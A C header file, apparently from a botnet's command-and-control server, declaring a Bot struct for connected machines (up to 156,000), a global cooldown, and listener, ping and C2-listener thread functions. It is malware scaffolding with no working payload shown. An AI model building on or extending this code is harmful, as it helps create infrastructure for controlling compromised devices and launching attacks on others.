#ifndef BOTNET_H
#define BOTNET_H

#include <arpa/inet.h>
#include <pthread.h>
#include "login_utils.h"
#include "checks.h"

#define MAX_BOTS 156000
#define MAX_COMMAND_LENGTH 2048
#define LIGHT_BLUE "\033[36m"
#define YELLOW "\033[33m"
#define RESET "\033[0m"
#define RED "\033[31m"
#define BLUE "\033[34m"
#define LIGHT_PINK "\033[95m"
#define NEON "\033[96m"
#define PINK "\033[35m"
#define GREEN "\033[32m"

typedef struct {
    int socket;
    struct sockaddr_in address;
    int is_valid;
    char arch[20];
    char group[64];
} Bot;

extern Bot bots[MAX_BOTS];
extern int bot_count;
extern int global_cooldown;
extern pthread_mutex_t bot_mutex;
extern pthread_mutex_t cooldown_mutex;

void* handle_bot(void* arg);
void* bot_listener(void* arg);
void* ping_bots(void* arg);
void* manage_cooldown(void* arg);
void* cnc_listener(void* arg);
void cleanup_socket(int* socket);

#endif
